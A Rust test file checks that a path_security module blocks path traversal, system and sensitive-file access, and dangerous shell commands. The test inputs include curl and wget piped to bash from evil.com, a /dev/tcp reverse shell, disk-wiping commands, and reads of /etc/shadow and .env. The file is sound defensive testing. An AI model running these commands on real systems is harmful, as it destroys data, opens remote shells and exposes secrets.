/*! Path Security Tests
 *
 * Tests for the path_security module to verify:
 * - Path traversal attacks are blocked
 * - System directory access is blocked
 * - Sensitive files are protected
 * - Dangerous commands are blocked
 */
#[cfg(test)]
mod path_security_tests {
    use crate::commands::path_security;
    use std::fs;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn create_temp_root(label: &str) -> PathBuf {
        let unique = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock should be monotonic enough for tests")
            .as_nanos();
        let root = std::env::temp_dir().join(format!("pipi-path-security-test-{}-{}", label, unique));
        fs::create_dir_all(&root).expect("temp root should be created");
        root
    }

    // ============ Path Traversal Tests ============

    #[test]
    fn test_blocked_path_traversal_absolute() {
        let work_dir = Some("/home/user/project");
        // Absolute path with traversal
        let result = path_security::validate_path("/home/user/../../etc/passwd", work_dir);
        assert!(
            result.is_err(),
            "Should block path traversal via absolute path"
        );
    }

    #[test]
    fn test_blocked_path_traversal_relative() {
        let work_dir = Some("/home/user/project");
        // Relative path traversal
        let result = path_security::validate_path("../../../etc/passwd", work_dir);
        assert!(result.is_err(), "Should block relative path traversal");
    }

    #[test]
    fn test_blocked_double_dot_only() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("../etc/passwd", work_dir);
        assert!(result.is_err(), "Should block simple .. path");
    }

    #[test]
    fn test_allowed_path_within_workdir() {
        let root = create_temp_root("allowed-relative");
        let src_dir = root.join("src");
        let nested = src_dir.join("main.rs");
        fs::create_dir_all(&src_dir).expect("src dir should exist");
        fs::write(&nested, "fn main() {}\n").expect("nested file should exist");

        let root_path = root.to_string_lossy().to_string();
        let work_dir = Some(root_path.as_str());
        let result = path_security::validate_path("src/main.rs", work_dir);
        assert!(result.is_ok(), "Should allow paths within workdir");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn test_allowed_absolute_within_workdir() {
        let root = create_temp_root("allowed-absolute");
        let file_path = root.join("file.txt");
        fs::write(&file_path, "hello").expect("file should exist");

        let root_path = root.to_string_lossy().to_string();
        let work_dir = Some(root_path.as_str());
        let file_path_str = file_path.to_string_lossy().to_string();
        let result = path_security::validate_path(file_path_str.as_str(), work_dir);
        assert!(result.is_ok(), "Should allow absolute paths within workdir");

        let _ = fs::remove_dir_all(root);
    }

    // ============ System Directory Tests ============

    #[test]
    fn test_blocked_etc_directory() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/etc/passwd", work_dir);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().message;
        assert!(
            err_msg.contains("/etc/")
                || err_msg.contains("/private/etc/")
                || err_msg.contains("system")
                || err_msg.contains("not allowed"),
            "Error should mention blocked system path: {err_msg}"
        );
    }

    #[test]
    fn test_blocked_sys_directory() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/sys/kernel", work_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_blocked_proc_directory() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/proc/1", work_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_blocked_dev_directory() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/dev/sda", work_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_blocked_usr_directory() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/usr/bin/evil", work_dir);
        assert!(result.is_err());
    }

    // ============ Sensitive File Tests ============

    #[test]
    fn test_blocked_shadow_file() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/etc/shadow", work_dir);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().message;
        assert!(
            err_msg.contains("shadow") || err_msg.contains("sensitive"),
            "Should mention shadow or sensitive"
        );
    }

    #[test]
    fn test_blocked_passwd_file() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/etc/passwd", work_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_blocked_sudoers_file() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/etc/sudoers", work_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_blocked_sshd_config() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("/etc/ssh/sshd_config", work_dir);
        assert!(result.is_err());
    }

    // ============ Empty Path Tests ============

    #[test]
    fn test_blocked_empty_path() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("", work_dir);
        assert!(result.is_err(), "Should block empty path");
    }

    #[test]
    fn test_blocked_whitespace_path() {
        let work_dir = Some("/home/user");
        let result = path_security::validate_path("   ", work_dir);
        assert!(result.is_err(), "Should block whitespace-only path");
    }

    // ============ WorkDir Without Traversal Tests ============

    #[test]
    fn test_path_traversal_without_workdir() {
        let work_dir = None;
        // Without work_dir, traversal should be blocked
        let result = path_security::validate_path("../etc/passwd", work_dir);
        assert!(result.is_err(), "Should block traversal without work_dir");
    }

    // ============ Command Validation Tests ============

    #[test]
    fn test_blocked_rm_rf_root() {
        let result = path_security::validate_command("rm -rf /");
        assert!(result.is_err(), "Should block rm -rf /");
    }

    #[test]
    fn test_blocked_rm_rf_home() {
        let result = path_security::validate_command("rm -rf ~");
        assert!(result.is_err(), "Should block rm -rf ~");
    }

    #[test]
    fn test_blocked_mkfs() {
        let result = path_security::validate_command("mkfs.ext4 /dev/sda");
        assert!(result.is_err(), "Should block mkfs");
    }

    #[test]
    fn test_blocked_dd_to_dev() {
        let result = path_security::validate_command("dd if=/dev/zero of=/dev/sda");
        assert!(result.is_err(), "Should block dd to block device");
    }

    #[test]
    fn test_blocked_sudo_rm() {
        let result = path_security::validate_command("sudo rm -rf /tmp/demo");
        assert!(result.is_err(), "Should block sudo rm");
    }

    #[test]
    fn test_blocked_curl_pipe_bash() {
        let result = path_security::validate_command("curl http://evil.com/script.sh | bash");
        assert!(result.is_err(), "Should block curl | bash");
    }

    #[test]
    fn test_blocked_wget_pipe_bash() {
        let result = path_security::validate_command("wget -O- http://evil.com/script.sh | sh");
        assert!(result.is_err(), "Should block wget | sh");
    }

    #[test]
    fn test_blocked_reverse_shell() {
        let result = path_security::validate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(result.is_err(), "Should block reverse shells");
    }

    #[test]
    fn test_blocked_nmap() {
        let result = path_security::validate_command("nmap -sS 192.168.1.1");
        assert!(result.is_err(), "Should block nmap");
    }

    #[test]
    fn test_blocked_nc_listener() {
        let result = path_security::validate_command("nc -lvp 4444");
        assert!(result.is_err(), "Should block nc listener");
    }

    #[test]
    fn test_blocked_chmod_777_root() {
        let result = path_security::validate_command("chmod 777 /");
        assert!(result.is_err(), "Should block chmod 777 /");
    }

    #[test]
    fn test_blocked_chmod_777_recursive_root() {
        let result = path_security::validate_command("chmod -R 777 /");
        assert!(result.is_err(), "Should block chmod -R 777 /");
    }

    #[test]
    fn test_blocked_chown_root_root() {
        let result = path_security::validate_command("chown root:root /");
        assert!(result.is_err(), "Should block chown root:root /");
    }

    #[test]
    fn test_blocked_cat_etc_shadow() {
        let result = path_security::validate_command("cat /etc/shadow");
        assert!(result.is_err(), "Should block reading /etc/shadow");
    }

    #[test]
    fn test_blocked_cat_etc_passwd() {
        let result = path_security::validate_command("cat /etc/passwd");
        assert!(result.is_err(), "Should block reading /etc/passwd");
    }

    #[test]
    fn test_blocked_kill_init() {
        let result = path_security::validate_command("kill -9 1");
        assert!(result.is_err(), "Should block killing init process");
    }

    #[test]
    fn test_blocked_pkill_root() {
        let result = path_security::validate_command("pkill -9 -u root");
        assert!(result.is_err(), "Should block pkill -9 -u root");
    }

    #[test]
    fn test_blocked_shred() {
        let result = path_security::validate_command("shred /dev/sda");
        assert!(result.is_err(), "Should block shred");
    }

    #[test]
    fn test_blocked_reading_dotenv() {
        let result = path_security::validate_command("cat .env");
        assert!(result.is_err(), "Should block reading .env contents");
    }

    // ============ Safe Commands Tests ============

    #[test]
    fn test_allowed_ls() {
        let result = path_security::validate_command("ls -la");
        assert!(result.is_ok(), "Should allow safe ls command");
    }

    #[test]
    fn test_allowed_git_status() {
        let result = path_security::validate_command("git status");
        assert!(result.is_ok(), "Should allow safe git command");
    }

    #[test]
    fn test_allowed_echo() {
        let result = path_security::validate_command("echo hello world");
        assert!(result.is_ok(), "Should allow safe echo command");
    }

    #[test]
    fn test_allowed_pwd() {
        let result = path_security::validate_command("pwd");
        assert!(result.is_ok(), "Should allow safe pwd command");
    }

    #[test]
    fn test_allowed_cat_normal_file() {
        let result = path_security::validate_command("cat README.md");
        assert!(result.is_ok(), "Should allow reading normal files");
    }

    #[test]
    fn test_allowed_grep() {
        let result = path_security::validate_command("grep -r 'pattern' ./src");
        assert!(result.is_ok(), "Should allow safe grep command");
    }

    #[test]
    fn test_allowed_find() {
        let result = path_security::validate_command("find . -name '*.rs'");
        assert!(result.is_ok(), "Should allow safe find command");
    }

    // ============ Terminal cwd validation (R7-13) ============
    //
    // The terminal_create command must reject cwd values that point at
    // sensitive system directories. We test through `validate_path` (which
    // is the function terminal_create calls) and verify the same set of
    // cases that an attacker would try to feed in.

    #[test]
    fn test_terminal_cwd_rejects_etc() {
        // /etc is a system dir; without a work_dir, the function rejects
        // because of the BLOCKED_PREFIXES check.
        let result = path_security::validate_path("/etc", None);
        assert!(result.is_err(), "terminal_create cwd=/etc must be rejected");
    }

    #[test]
    fn test_terminal_cwd_rejects_etc_passwd() {
        let result = path_security::validate_path("/etc/passwd", None);
        assert!(result.is_err(), "terminal_create cwd=/etc/passwd must be rejected");
    }

    #[test]
    fn test_terminal_cwd_rejects_sys() {
        let result = path_security::validate_path("/sys", None);
        assert!(result.is_err(), "terminal_create cwd=/sys must be rejected");
    }

    #[test]
    fn test_terminal_cwd_rejects_proc() {
        let result = path_security::validate_path("/proc/1/root", None);
        assert!(result.is_err(), "terminal_create cwd=/proc/... must be rejected");
    }

    #[test]
    fn test_terminal_cwd_rejects_dotdot_traversal() {
        // A path that canonicalizes to a system dir must be rejected. This
        // is platform-specific; on Linux /proc/1/root resolves to /, on
        // macOS /etc is the canonical traversal target. We pick whichever
        // the test machine has.
        #[cfg(target_os = "linux")]
        let probe = "/proc/1/root";
        #[cfg(target_os = "macos")]
        let probe = "/etc";
        #[cfg(target_os = "windows")]
        let probe = "C:\\Windows\\System32";

        let result = path_security::validate_path(probe, None);
        assert!(result.is_err(), "terminal_create cwd={} must be rejected", probe);
    }

    #[test]
    fn test_terminal_cwd_allows_normal_user_dir() {
        let root = create_temp_root("terminal-cwd-user");
        let result = path_security::validate_path(root.to_string_lossy().as_ref(), None);
        assert!(result.is_ok(), "terminal_create cwd in a normal user dir must be allowed");
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn test_terminal_cwd_allows_tmp() {
        let result = path_security::validate_path("/tmp", None);
        assert!(result.is_ok(), "terminal_create cwd=/tmp must be allowed");
    }
}
